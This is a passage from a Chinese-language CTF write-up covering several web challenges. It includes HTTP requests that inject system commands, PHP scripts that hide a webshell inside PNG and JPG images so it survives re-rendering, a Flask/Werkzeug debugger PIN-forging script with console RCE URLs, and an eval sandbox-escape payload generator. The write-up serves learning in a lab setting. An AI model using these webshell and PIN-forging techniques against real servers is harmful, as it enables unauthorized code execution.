Cookie: session=.eJwdzEEKhDAMRuGriJtfQQpu5yrDEKK2JZBpxLgrvbvF3cdbvLHiMo34DBVJOXeg1t1KkhyIdmV3oi4pcr_Iahtrj1-Y4xdOO2OZoI45XJGPaW4NywBx4uMvpR_X1sYHcqgjaw.ZzLazQ.ooi1rFFcRpKjlpnBaC3o5J4qgS0; 48ae8e2eeee8042747cc027fc005ec9a__typecho_uid=1; 48ae8e2eeee8042747cc027fc005ec9a__typecho_authCode=%24T%241IvP2MK0L6e9f60338925f96e43cbe9860ec2af6c; PHPSESSID=b87ef121755b0de8f2b91c2559430a8c
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```

```
POST /pay/index/pay_callback.html HTTP/1.1
Host: 210.44.150.15:36497
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=.eJwdzEEKhDAMRuGriJtfQQpu5yrDEKK2JZBpxLgrvbvF3cdbvLHiMo34DBVJOXeg1t1KkhyIdmV3oi4pcr_Iahtrj1-Y4xdOO2OZoI45XJGPaW4NywBx4uMvpR_X1sYHcqgjaw.ZzLazQ.ooi1rFFcRpKjlpnBaC3o5J4qgS0; 48ae8e2eeee8042747cc027fc005ec9a__typecho_uid=1; 48ae8e2eeee8042747cc027fc005ec9a__typecho_authCode=%24T%241IvP2MK0L6e9f60338925f96e43cbe9860ec2af6c; PHPSESSID=b87ef121755b0de8f2b91c2559430a8c
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

out_trade_no[0]=eq&out_trade_no[1]=tac+/f*&out_trade_no[2]=system
```

## [Week3] 拜师之旅·番外

文件上传，阿帕奇，貌似是只能二次渲染，因为一直说只能上传图片，那上网搞到脚本来整一下

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 

$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'1.png');  //要修改的图片的路径
 
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */
//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在
//会在目录下自动创建一个1.png图片
//图片脚本内容：$_GET[0]($_POST[1]);
//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php
?>
```

更好的脚本

```php
<?php 
/* cX<?PHP 不可取消 但可以替换为c<?=
   ?>X<0x00><0x00> 不可删除。*/
$a='cX<?PHP FILE_PUT_CONTENTS();?>X'.urldecode('%00').urldecode('%00');

$payload_ascii='';
for($i=0;$i<strlen($a);$i++){
    $payload_ascii.=bin2hex($a[$i]);
}

$payload_hex=bin2hex(gzinflate(hex2bin($payload_ascii)));

// echo $payload_hex."\n";
preg_match_all('/[a-z0-9]{2}/', $payload_hex, $matches);

$blist=[];

foreach($matches[0] as $key => $value){
    $blist[$key]=base_convert($value, 16, 10);
}

function filter1($blist){
    for($i=0; $i<(count($blist)-3);$i++){
        $blist[$i+3] = ($blist[$i+3] + $blist[$i]) %256;
    }
    return array_values($blist);
}

function filter3($blist){
    for($i=0; $i<(count($blist)-3);$i++){
        $blist[$i+3] = ($blist[$i+3] + floor($blist[$i]/2) ) %256;
    }
    return array_values($blist);
}
$p=array_merge(filter1($blist), filter3($blist));
$img = imagecreatetruecolor(32, 32);

// echo sizeof($p);
for ($y = 0; $y < sizeof($p)-3; $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   // echo $color;
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
```

jpg的渲染脚本也放一下

```php
<?php
    /*
将有效载荷注入JPG图像的算法，该算法在PHP函数imagecopyresized()和imagecopyresampled()引起的变换后保持不变。
初始图像的大小和质量必须与处理后的图像的大小和质量相同。
1)通过安全文件上传脚本上传任意图像
2)保存处理后的图像并启动:
php 文件名.php <文件名.jpg >
如果注射成功，您将获得一个特制的图像，该图像应再次上传。
由于使用了最直接的注射方法，可能会出现以下问题:
1)在第二次处理之后，注入的数据可能变得部分损坏。
jpg _ payload.php脚本输出“有问题”。
如果发生这种情况，请尝试更改有效载荷(例如，在开头添加一些符号)或尝试另一个初始图像。
谢尔盖·博布罗夫@Black2Fan。
另请参见:
https://www . idontplaydarts . com/2012/06/encoding-we B- shell-in-png-idat-chunks/
*/

    $miniPayload = '<?=eval($_POST[1]);?>';
 
 
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
    
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
 
    set_error_handler("custom_error_handler");
 
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
 
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
 
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
 
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

这道题是png我直接用的第一个脚本

![1](QQ20241112-150814.png)

执行命令之后立马就保存

![1](QQ20241112-151235.png)

![1](QQ20241112-151211.png)



## [Week3] 顰

F12看到是flask，这样子一看就是flask计算pin

首先读取的东西

```
/etc/passwd
root

flask.app
Flask

/sys/class/net/eth0/address
c2:91:50:cb:a8:92

/proc/sys/kernel/random/boot_id
d45a88e1-3fe4-4156-9e59-3864587b7c87

/proc/self/cgroup
0::/
```

```python
import hashlib
from itertools import chain
import argparse


def getMd5Pin(probably_public_bits, private_bits):
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv


def getSha1Pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x: x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv


def macToInt(mac):
    mac = mac.replace(":", "")
    return str(int(mac, 16))


if __name__ == '__main__':
    parse = argparse.ArgumentParser(description="Calculate Python Flask Pin")
    parse.add_argument('-u', '--username', required=True, type=str, help="运行flask用户的用户名")
    parse.add_argument('-m', '--modname', type=str, default="flask.app", help="默认为flask.app")
    parse.add_argument('-a', '--appname', type=str, default="Flask", help="默认为Flask")
    parse.add_argument('-p', '--path', required=True, type=str,
                       help="getattr(mod, '__file__', None):flask包中app.py的路径")
    parse.add_argument('-M', '--MAC', required=True, type=str, help="MAC地址")
    parse.add_argument('-i', '--machineId', type=str, default="", help="机器ID")
    args = parse.parse_args()

    probably_public_bits = [
        args.username,
        args.modname,
        args.appname,
        args.path
    ]

    private_bits = [
        macToInt(args.MAC),
        bytes(args.machineId, encoding='utf-8')
    ]
    md5Pin = getMd5Pin(probably_public_bits, private_bits)
    sha1Pin = getSha1Pin(probably_public_bits, private_bits)

    print("Md5Pin:  " + md5Pin)
    print("Sha1Pin:  " + sha1Pin)

# python "c:\Users\xxx\Documents\VSCODE\.vscode\python\index.py" -u flaskweb -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 92:8a:43:bb:5b:c3 -i 1408f836b0ca514d796cbf8960e45fa1
```

```
python index.py -u root -p /usr/local/lib/python3.10/site-packages/flask/app.py -M c2:91:50:cb:a8:92 -i d45a88e1-3fe4-4156-9e59-3864587b7c87

Md5Pin:  296-861-787
Sha1Pin:  623-633-168
```

但是总是进不去，本地来个demo

```python
from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello():
    return 'test'

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8088, debug=True)

```

![1](QQ20241112-154834.png)

进console查看源码发现这个

```
/console?__debugger__=yes&cmd=pinauth&pin=107-791-646&s=KWiiNi1LsEQEWD81tgor
```

![1](QQ20241112-155013.png)

也就是说这里是有个多的东西来验证身份的，那么我们就是要把这些参数全部带上才可以命令执行

![1](QQ20241112-160708.png)

这里进console也是非常奇葩，抓一次包才能进

```
 var  CONSOLE_MODE = true,
      EVALEX = true,
      EVALEX_TRUSTED = false,
      SECRET = "QaUwOvTCEcKSmY8NELTA";
```

```
Md5Pin:  296-861-787
Sha1Pin:  623-633-168

/console?__debugger__=yes&cmd=pinauth&pin=623-633-168&s=QaUwOvTCEcKSmY8NELTA
```

拿到

```
__wzdc1e82870ae37b6827c7a=1731399932|b563fd4cd0d3;
```

然后就执行命令发现一直不能成功，

```
/console?&__debugger__=yes&cmd=open('/flag').read()&frm=0&s=QaUwOvTCEcKSmY8NELTA
```

![1](QQ20241112-162742.png)

**cookie**带上就不用写`pin`了

这里写了好久，报错那个路径拿不到，最后发现是默认的，还有就是命令执行这里，少写了参数，谢谢CX和橘子

## [Week4] 0进制计算器

```python
from flask import Flask, render_template, request, jsonify
  
app = Flask(__name__)  
  
@app.route('/')  
def home():  
    return render_template('index.html') 

@app.route('/execute', methods=['POST'])  
def execute_code():  
    data = request.json  
    code = data.get('code', '')  
    output = executer(code)
    return output   

from contextlib import redirect_stdout
from io import StringIO

class StupidInterpreter:  
    def __init__(self):  
        self.variables = {}
        
    def interpret(self, code):  
        if self.checker(code) == False:
            print("有脏东西！")
            return("")
        commands = code.split(';')  
        for command in commands:  
            command = command.strip()  
            if command:  
                self.execute_command(command)  
  
    def execute_command(self, command):  
        if '=' in command:  
            variable, expression = command.split('=', 1)  
            variable = variable.strip()  
            result = self.evaluate_expression(expression.strip())  
            self.variables[variable] = result  
        #执行打印操作
        elif command.startswith('cdhor(') and command.endswith(')'):
            expression = command[6:-1].strip()  
            result = self.evaluate_expression(expression)  
            print(result)  
        else:  
            print(f"未知指令: {command}")  
            return("")
    def evaluate_expression(self, expression):  
        for var, value in self.variables.items():  
            expression = expression.replace(var, str(value))  
        try:  
            return eval(expression, {}, {})
        except Exception as e:  
            print(f"执行出错: {e}")  
            return None  
                
    def checker(self, string):
        try:
            string.encode("ascii")
        except UnicodeEncodeError:
            return False 
        allow_chr = '0cdhor+-*/=()"\'; '
        for char in string:  
            if char not in allow_chr:  
                return False    

def executer(code):
    outputIO = StringIO()
    interpreter = StupidInterpreter()  
    with redirect_stdout(outputIO):
        interpreter.interpret(code)
    output = outputIO.getvalue()
    return(output)
    
if __name__ == '__main__':  
    app.run(debug=False)
```

执行命令的代码就这个

```python
def execute_command(self, command):  
        if '=' in command:  
            variable, expression = command.split('=', 1)  
            variable = variable.strip()  
            result = self.evaluate_expression(expression.strip())  
            self.variables[variable] = result  
        #执行打印操作
        elif command.startswith('cdhor(') and command.endswith(')'):
            expression = command[6:-1].strip()  
            result = self.evaluate_expression(expression)  
            print(result)  
        else:  
            print(f"未知指令: {command}")  
            return("")
```

黑名单是这个

```
0cdhor+-*/=()"\'; 
```

那应该是chr 和ord的合作了，这里一边是自定义打印一边是赋值，还是选择赋值

```python
import os
def generate_char(char):
    char_ascii_bin = str(bin(ord(char)))
    end = ""
    result = []
    index = len(char_ascii_bin) - 1
    for a in char_ascii_bin:
        if index == 0 and a == "1":
            result.append("(ord('*')-ord(')'))")
            break
        if index != 0 and a == "1":
            mid_res = ["(ord('*')-ord('('))" for i in range(index)]
            result.append("*".join(mid_res))
        index -= 1
    return("+".join(result))

def generate_sentence(string):
    char_expressions = ["chr(" + generate_char(char) + ")" for char in string]
    sentence_expression = "+".join(char_expressions)
    return(sentence_expression)

char_values = {
    '(': 40,
    ')': 41,
    '*': 42
}

sentence = """__import__('os').popen('ls /').read()
"""
sentence = generate_sentence(sentence)
print(sentence)
```

但是不知道为啥没有回显(只有在cdhor()里面执行的命令才有回显

## oi

干不动了，好多审计和java

```
https://mp.weixin.qq.com/s/ekss3fOeQhhfVNMIvqrP1Q
```

官方wp 看了看思路

# 0x03 

感觉挺好的，学到了一些东西
